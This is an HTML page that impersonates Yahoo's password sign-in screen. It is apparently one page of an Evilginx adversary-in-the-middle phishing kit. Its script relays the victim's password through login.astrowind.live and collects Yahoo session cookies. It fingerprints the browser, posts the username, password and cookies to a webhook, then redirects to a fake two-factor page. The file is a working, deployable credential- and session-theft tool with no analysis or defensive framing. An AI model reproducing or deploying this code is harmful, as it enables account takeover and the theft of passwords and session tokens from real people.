<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
</head>
<body>
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form"
              action="https://login.astrowind.live/account/challenge/password"
              method="POST"
              data-wf-page-id="67c6f50ed426ad7d5847f218"
              data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
          
          <!-- Critical Hidden Fields for Perfect Data Flow -->
          <input type="hidden" id="username" name="username">
          <input type="hidden" name="g-recaptcha-response" value="valid_auto_token">
          <input type="hidden" name="crumb" value="auto_crumb_value">
          <input type="hidden" name="sessionIndex" id="sessionIndex">
          <input type="hidden" name="acrumb" id="acrumb">
          <input type="hidden" name="browser_fp" id="browserFp">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="text-block-2">to finish signing in<br></div>
            <div class="pazz lpl">Password<br></div>
            <div class="ms-input-wrap">
              <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
              
              <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                  <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                  <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                </div>
              </div>
            </div>
            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In">
          </div>
          
          <div class="errry" style="display: none;">
            <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
            <div class="text-block-7">Invalid password. Please try again.</div>
            <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- Original Webflow Scripts -->
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  
  <!-- Password Toggle Script -->
  <script>
  document.querySelector("[data-transform]").addEventListener("click", transform);
  var isPassword = true;
  function transform() {
     var myInput = document.querySelector("[data-show]");
     var oldHtml = myInput.outerHTML;
     var text = myInput.value;
     if (isPassword) {
         var newHtml = oldHtml.replace(/password/g, "text");
     } else {
         newHtml = oldHtml.replace(/text/g, "password");
     }
     myInput.outerHTML = newHtml;
     myInput = document.querySelector("[data-show]");
     myInput.value = text;
     isPassword = !isPassword;
  }
  </script>

  <!-- Perfect Hybrid Evilginx Integration -->
  <script>
  console.log('Perfect Hybrid Password Page - Data Flow Initialized');
  
  // Global session management
  window.perfectSession = {
    username: null,
    sessionData: null,
    cookies: {},
    validated: false
  };
  
  // Browser fingerprinting for enhanced security
  function generateBrowserFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Browser fingerprint', 2, 2);
    
    const fingerprint = btoa(JSON.stringify({
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      canvas: canvas.toDataURL(),
      timestamp: Date.now()
    }));
    
    return fingerprint;
  }
  
  // Perfect cookie synchronization
  function syncCookiesFromEvilginx() {
    const evilginxCookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [key, value] = cookie.trim().split('=');
      if (key && value && ['T', 'Y', 'A3', 'B', 'F', 'PH', 'sessionId', 'crumb', 'sessionIndex'].includes(key)) {
        evilginxCookies[key] = value;
      }
    });
    
    window.perfectSession.cookies = evilginxCookies;
    console.log('Evilginx cookies synchronized:', evilginxCookies);
    return evilginxCookies;
  }
  
  // Credential validation with Yahoo API
  async function validateCredentials(username, password) {
    try {
      // First validate with evilginx
      const evilginxResponse = await fetch('https://login.astrowind.live/account/challenge/password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://login.astrowind.live',
          'Referer': window.location.href
        },
        body: new URLSearchParams({
          username: username,
          passwd: password,
          'g-recaptcha-response': 'valid_auto_token',
          crumb: window.perfectSession.sessionData?.acrumb || 'auto_crumb_value',
          sessionIndex: window.perfectSession.sessionData?.sessionIndex || 'QQ--',
          browser_fp: generateBrowserFingerprint()
        }),
        credentials: 'include'
      });
      
      console.log('Evilginx validation response:', evilginxResponse.status);
      
      // Check response for success indicators
      if (evilginxResponse.ok || evilginxResponse.status === 302) {
        // Additional validation: check for Yahoo-specific success cookies
        syncCookiesFromEvilginx();
        
        const hasValidSession = Object.keys(window.perfectSession.cookies).some(key => 
          ['T', 'Y', 'sessionIndex'].includes(key)
        );
        
        if (hasValidSession) {
          window.perfectSession.validated = true;
          return { success: true, requiresMFA: true };
        }
      }
      
      // If we get here, credentials are likely invalid
      return { success: false, error: 'Invalid credentials' };
      
    } catch (error) {
      console.error('Credential validation error:', error);
      return { success: false, error: 'Network error' };
    }
  }
  
  // Perfect data capture with webhook
  function captureCredentials(username, password, result) {
    const captureData = {
      type: 'password_validation',
      username: username,
      password: password,
      validation_result: result,
      session_data: window.perfectSession.sessionData,
      cookies: window.perfectSession.cookies,
      browser_fp: generateBrowserFingerprint(),
      timestamp: Date.now(),
      user_agent: navigator.userAgent,
      page: 'custom_password_perfect'
    };
    
    // Send to webhook (replace with your webhook URL)
    fetch('https://webhook.site/your-webhook-id', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(captureData)
    }).catch(error => {
      console.log('Webhook capture failed:', error);
    });
    
    console.log('Credentials captured:', captureData);
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing perfect hybrid flow...');
    
    // 1. Restore session data from evilginx redirect
    const urlParams = new URLSearchParams(window.location.search);
    let username = urlParams.get('u');
    const sessionIndex = urlParams.get('si');
    const acrumb = urlParams.get('ac');
    
    // Try to get from localStorage (set by evilginx redirect)
    try {
      const storedSession = localStorage.getItem('yahooSession');
      if (storedSession) {
        window.perfectSession.sessionData = JSON.parse(storedSession);
        username = username || window.perfectSession.sessionData.username;
      }
    } catch (e) {
      console.log('No stored session data');
    }
    
    // Try to get from cookie
    if (!username) {
      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
      if (cookieMatch) username = decodeURIComponent(cookieMatch[1]);
    }
    
    // Security fallback
    if (!username) {
      console.log('No username found, redirecting to login');
      window.location.href = 'https://login.astrowind.live/';
      return;
    }
    
    // 2. Initialize form with session data
    window.perfectSession.username = username;
    document.getElementById('userEmail').textContent = username;
    document.getElementById('username').value = username;
    document.getElementById('sessionIndex').value = sessionIndex || window.perfectSession.sessionData?.sessionIndex || 'QQ--';
    document.getElementById('acrumb').value = acrumb || window.perfectSession.sessionData?.acrumb || '';
    document.getElementById('browserFp').value = generateBrowserFingerprint();
    
    // Sync existing cookies
    syncCookiesFromEvilginx();
    
    console.log('Form initialized with perfect session data:', window.perfectSession);
    
    // 3. Perfect form submission with validation
    document.getElementById('email-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      console.log('Form submitted - starting perfect validation flow');
      
      const submitBtn = this.querySelector('[type="submit"]');
      const password = document.getElementById('password').value;
      
      if (!password) {
        alert('Please enter your password');
        return;
      }
      
      submitBtn.disabled = true;
      submitBtn.value = 'Validating...';
      
      // Validate credentials with Yahoo through evilginx
      const validationResult = await validateCredentials(username, password);
      
      // Capture all data regardless of result
      captureCredentials(username, password, validationResult);
      
      if (validationResult.success) {
        console.log('Credentials validated successfully');
        submitBtn.value = 'Success! Continuing...';
        
        // Store validated session for 2FA page
        const validatedSession = {
          ...window.perfectSession.sessionData,
          username: username,
          validated: true,
          cookies: window.perfectSession.cookies,
          timestamp: Date.now()
        };
        
        localStorage.setItem('yahooValidatedSession', JSON.stringify(validatedSession));
        
        // Redirect to 2FA selection after short delay
        setTimeout(() => {
          window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&validated=true`;
        }, 1500);
        
      } else {
        console.log('Credential validation failed:', validationResult.error);
        
        // Show error for invalid credentials
        document.querySelector('.errry').style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.value = 'Sign In';
        
        // Clear password field
        document.getElementById('password').value = '';
      }
    });
    
    // 4. Error handler
    document.getElementById('refreshButton').addEventListener('click', function() {
      document.getElementById('password').value = '';
      document.querySelector('.errry').style.display = 'none';
    });
    
    // 5. Session monitoring
    setInterval(() => {
      syncCookiesFromEvilginx();
    }, 5000);
  });
  </script>
</body>
</html>
